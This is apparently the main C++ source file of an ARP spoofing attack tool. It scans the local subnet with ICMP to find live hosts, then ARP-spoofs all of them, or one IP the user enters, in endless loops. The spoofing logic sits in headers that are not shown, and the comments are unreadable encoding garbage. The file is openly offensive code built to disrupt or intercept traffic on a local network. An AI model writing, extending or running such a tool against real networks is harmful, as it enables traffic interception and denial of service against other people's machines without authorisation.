#include "ArpSpoof.h"
#include "IcmpDetect.h"
#include "global.h"
#include <stdio.h>


int main()
{
	u_int net; // �����ַ
	u_int mask; // ��������
	u_int local_ip; // ����IP
	int op;

	ArpSpoof arpSpoof = ArpSpoof();
	NetworkAdapter adapter = NetworkAdapter();

	// ��ȡ��������Ĳ���: �����ַ, ��������
	net = arpSpoof.getNetAddr();
	adapter.getLocalIpAndMask(&local_ip, &mask);
	
	printf("\nYou wanna attack all hosts(1) OR just one(2)? ");
	scanf("%d", &op);
	getchar();

	if (op == 1)
	{
		// ɨ������, �õ���������б�
		List host_list, p;
		IcmpDetect detect = IcmpDetect(net, mask);

		printf("\nsearching for alive hosts, which will takes several seconds...\n");
		detect.beginDetect();
		host_list = detect.getAliveHosts();
		//List_Display(host_list);

		if (List_isEmpty(host_list))
		{
			printf("\n\nno alive hosts found!");
			exit(1);
		}

		printf("\n\ngot all alive hosts, begin attacking...\n\n");
		for (int num = 1;;num++)
		{
			for (p = host_list->next;p;p = p->next)
			{
				arpSpoof.beignAttack(p->e);
			}
			printf("round: 0x%.8X", num);
			for (size_t i = 0;i < strlen("round: 0x") + 8;i++) { printf("\b"); }
		}
	}
	else if (op == 2)
	{
		char addr[32];
		printf("\nInput IP: ");
		scanf("%s", addr);
		u_int dst_ip = inet_addr(addr);

		printf("\nattacking......");
		for (;;)
		{
			arpSpoof.beignAttack(dst_ip);
		}
	}
}